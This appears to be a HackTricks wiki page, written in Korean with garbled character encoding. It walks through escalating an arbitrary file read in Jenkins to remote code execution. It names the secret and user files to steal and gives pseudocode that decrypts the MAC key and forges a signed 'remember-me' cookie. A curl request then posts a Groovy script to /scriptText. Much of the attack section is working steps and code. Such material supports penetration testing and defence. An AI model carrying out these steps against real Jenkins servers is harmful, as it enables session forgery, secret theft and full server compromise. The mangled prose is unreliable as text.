# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì—ì„œëŠ” Jenkinsì˜ Local File Inclusion ì·¨ì•½ì ì„ RCEë¡œ ë³€í™˜í•˜ëŠ” í›Œë¥­í•œ ë°©ë²•ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

ì´ê²ƒì€ ì„ì˜ì˜ ì¿ í‚¤ë¥¼ ì¡°ì‘í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ë°©ë²•ì— ëŒ€í•œ ê²Œì‹œë¬¼ì˜ ìš”ì•½ì…ë‹ˆë‹¤. ì œê°€ ì§ì ‘ ìš”ì•½ì„ ì‘ì„±í•  ì‹œê°„ì´ ìƒê¸¸ ë•Œê¹Œì§€ ì‚¬ìš©ë©ë‹ˆë‹¤:

### Attack Prerequisites

* **Feature Requirement:** "Remember me"ê°€ í™œì„±í™”ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤ (ê¸°ë³¸ ì„¤ì •).
* **Access Levels:** ê³µê²©ìëŠ” Overall/Read ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.
* **Secret Access:** ì£¼ìš” íŒŒì¼ì—ì„œ ì´ì§„ ë° í…ìŠ¤íŠ¸ ì½˜í…ì¸ ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ëŠ¥ë ¥.

### Detailed Exploitation Process

#### Step 1: Data Collection

**User Information Retrieval**

* ê° ì‚¬ìš©ìì— ëŒ€í•œ `$JENKINS_HOME/users/*.xml`ì—ì„œ ì‚¬ìš©ì êµ¬ì„± ë° ë¹„ë°€ì„ ì•¡ì„¸ìŠ¤í•˜ì—¬ ë‹¤ìŒì„ ìˆ˜ì§‘í•©ë‹ˆë‹¤:
* **Username**
* **User seed**
* **Timestamp**
* **Password hash**

**Secret Key Extraction**

* ì¿ í‚¤ ì„œëª…ì— ì‚¬ìš©ë˜ëŠ” ì•”í˜¸í™” í‚¤ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤:
* **Secret Key:** `$JENKINS_HOME/secret.key`
* **Master Key:** `$JENKINS_HOME/secrets/master.key`
* **MAC Key File:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Step 2: Cookie Forging

**Token Preparation**

*   **í† í° ë§Œë£Œ ì‹œê°„ ê³„ì‚°:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // í˜„ì¬ ì‹œê°„ì— 1ì‹œê°„ ì¶”ê°€
```
{% endcode %}
*   **í† í°ì„ ìœ„í•œ ë°ì´í„° ì—°ê²°:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Key Decryption**

*   **MAC Key íŒŒì¼ ë³µí˜¸í™”:**

```javascript
key = toAes128Key(masterKey)  // ë§ˆìŠ¤í„° í‚¤ë¥¼ AES128 í‚¤ í˜•ì‹ìœ¼ë¡œ ë³€í™˜
decrypted = AES.decrypt(macFile, key)  // .mac íŒŒì¼ ë³µí˜¸í™”
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Signature Computation**

*   **HMAC SHA256 ê³„ì‚°:**

```javascript
mac = HmacSHA256(token, macKey)  // í† í°ê³¼ MAC í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ HMAC ê³„ì‚°
tokenSignature = bytesToHexString(mac)  // MACì„ 16ì§„ìˆ˜ ë¬¸ìì—´ë¡œ ë³€í™˜
```

**Cookie Encoding**

*   **ìµœì¢… ì¿ í‚¤ ìƒì„±:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // ì¿ í‚¤ ë°ì´í„°ë¥¼ Base64ë¡œ ì¸ì½”ë”©
```
{% endcode %}

#### Step 3: Code Execution

**Session Authentication**

* **CSRF ë° ì„¸ì…˜ í† í° ê°€ì ¸ì˜¤ê¸°:**
* `/crumbIssuer/api/json`ì— ìš”ì²­ì„ ë³´ë‚´ `Jenkins-Crumb`ë¥¼ ì–»ìŠµë‹ˆë‹¤.
* ì‘ë‹µì—ì„œ `JSESSIONID`ë¥¼ ìº¡ì²˜í•˜ì—¬ remember-me ì¿ í‚¤ì™€ í•¨ê»˜ ì‚¬ìš©í•©ë‹ˆë‹¤.

**Command Execution Request**

*   **Groovy ìŠ¤í¬ë¦½íŠ¸ë¡œ POST ìš”ì²­ ë³´ë‚´ê¸°:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy ìŠ¤í¬ë¦½íŠ¸ëŠ” ì‹œìŠ¤í…œ ìˆ˜ì¤€ì˜ ëª…ë ¹ì´ë‚˜ Jenkins í™˜ê²½ ë‚´ì—ì„œ ë‹¤ë¥¸ ì‘ì—…ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì œê³µëœ curl ëª…ë ¹ ì˜ˆì‹œëŠ” ì„ì˜ì˜ ì½”ë“œë¥¼ ì•ˆì „í•˜ê²Œ ì‹¤í–‰í•˜ê¸° ìœ„í•´ í•„ìš”í•œ í—¤ë”ì™€ ì¿ í‚¤ë¡œ Jenkinsì— ìš”ì²­ì„ ë³´ë‚´ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
